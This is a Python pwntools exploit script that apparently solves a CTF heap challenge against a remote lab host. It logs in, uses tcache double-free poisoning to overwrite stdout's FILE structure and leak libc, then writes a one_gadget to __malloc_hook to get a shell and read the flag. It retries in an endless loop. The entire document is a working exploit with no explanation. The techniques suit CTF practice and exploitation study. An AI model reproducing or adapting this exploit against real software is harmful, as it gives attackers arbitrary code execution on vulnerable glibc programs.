from pwn import *
context(log_level='debug', arch='amd64', os='linux',aslr=False)
 
exe = './pwn'
elf = ELF(exe)
libc = ELF(libc.so)
 
#io = process(exe)#, env={"LD_PRELOAD":libc.path})
#io = remote("1c0e562267cef024c5fea2950a3c9bea.kr-lab.com",40001)
 
def Debug():
    gdb.attach(io)
    pause()

 
def choice(idx):
    io.recvuntil('>')
    io.sendline(str(idx))

def add(size,description):
    choice(1)
    io.recvuntil('book name:')
    io.send('zoniony')
    io.recvuntil('description size:')
    io.sendline(str(size))
    io.recvuntil('description:')
    io.send(description)

def dele(idx):
    choice(2)
    io.recvuntil('index:')
    io.sendline(str(idx))

def pwn(io):
    username = 'admin'
    password = 'frame'
    io.recvuntil('username:')
    io.sendline(username)
    io.recvuntil('password:')
    io.sendline(password)
    add(0xff,"A"*8)#0
    add(0xff,"A"*8)#1
    dele(0)
    dele(0)
    add(0xff,p16(0x32c8))#2
    add(0xff,"A")#3
    add(0xef,"A")#4
    dele(4)
    dele(4)
    add(0xef,p64(0x602060))#5
    add(0xef,"A")
    add(0xef,p64(0)*8)
    add(0xdf,"A")#0
    dele(0)
    dele(0)
    add(0xdf,p16(0x32c8))#1
    add(0xdf,"A")#2
    add(0xdf,p16(0x8760))#3 !!!stdout
    add(0xff,"A")#4
    add(0xcf,"A")
    dele(5)
    dele(5)
    add(0xcf,p64(0x602060))#5
    add(0xcf,"A")
    add(0xcf,p64(0)*9)
    payload  = ""
    payload += p64(0xfbad3c80) #_flags= ((stdout->flags & ~ _IO_NO_WRITES)|_IO_CURRENTLY_PUTTING)|_IO_IS_APPENDING
    payload += p64(0)          #_IO_read_ptr
    payload += p64(0)          #_IO_read_end
    payload += p64(0)          #_IO_read_base
    payload += "\x08"          # overwrite last byte of _IO_write_base to point to libc address
    add(0xff,payload)#0
    libc.address = u64(io.recv(6)+'\x00\x00')-0x3ed8b0
    success("libc.address-->"+hex(libc.address))
    add(0x48,"A")#1
    dele(1)
    dele(1)
    add(0x48,p64(libc.sym["__malloc_hook"]))
    add(0x48,"A")
    add(0x48,p64(libc.address+0x10a38c))
    io.sendline("1")
    io.sendline("cat flag")
    io.interactive()

while True:
    try:
        io = remote("1c0e562267cef024c5fea2950a3c9bea.kr-lab.com",40001)
        pwn(io)
    except Exception as e:
        io.close()